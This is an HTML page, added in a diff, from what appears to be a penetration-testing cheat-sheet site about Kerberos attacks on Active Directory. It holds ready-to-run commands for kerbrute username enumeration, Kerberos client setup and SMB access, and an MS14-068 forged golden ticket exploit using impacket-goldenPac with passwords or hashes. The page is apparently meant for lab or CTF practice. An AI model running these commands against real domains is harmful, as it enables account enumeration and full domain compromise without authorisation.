@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Kerberos | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/kerberos/">
+      <span>Kerberos</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@kerbrute/">Kerbrute</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ad/">Ad</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@smb/">Smb</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@ms14-068/">MS14-068</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@golden-ticket/">Golden Ticket</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@goldpac/">Goldpac</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="kerbrute">Kerbrute</h3>
+<p><a href="https://github.com/ropnop/kerbrute">Download kerbrute</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos Ticket (From Linux)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install krb5-user cifs-utils
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Step 1: Add domain controller to `/etc/hosts`</span>
+</span></span><span class="line"><span class="cl">10.10.11.10 example.com dc01.example.com dc01
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Add domain controller as a DNS server to `/etc/resolv.conf`</span>
+</span></span><span class="line"><span class="cl">nameserver 10.10.11.10
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: Edit `/etc/krb5.conf`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>libdefaults<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">default_realm</span> <span class="o">=</span> EXAMPLE.COM
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>realms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    example.com <span class="o">=</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">kdc</span> <span class="o">=</span> dc01.example.com:88
+</span></span><span class="line"><span class="cl">        <span class="nv">admin_serve</span> <span class="o">=</span> dc01.example.com
+</span></span><span class="line"><span class="cl">        <span class="nv">default_domain</span> <span class="o">=</span> example.com
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>domain_realm<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    .domain.internal <span class="o">=</span> example.com
+</span></span><span class="line"><span class="cl">    domain.internal <span class="o">=</span> example.com
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 4: Sync time to domain controller</span>
+</span></span><span class="line"><span class="cl">ntpdate -s example.com
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Generate kerberos ticket for user: user</span>
+</span></span><span class="line"><span class="cl">kinit user
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Check ticket</span>
+</span></span><span class="line"><span class="cl">klist
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="connect-to-smb-with-kerberos">Connect to SMB with kerberos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">smbclient -W example.com //DC01/SYSVOL -k
+</span></span></code></pre></div><br>
+<hr>
+<h3 id="ms14-068-forged-golden-ticket">MS14-068 (Forged Golden Ticket)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># With creds</span>
+</span></span><span class="line"><span class="cl">impacket-goldenPac <span class="s1">&#39;example.com/user:password@dc01&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With hash</span>
+</span></span><span class="line"><span class="cl">impacket-goldenPac --hashes :hash <span class="s1">&#39;example.com/user@dc01&#39;</span>
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/copy-code-button.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
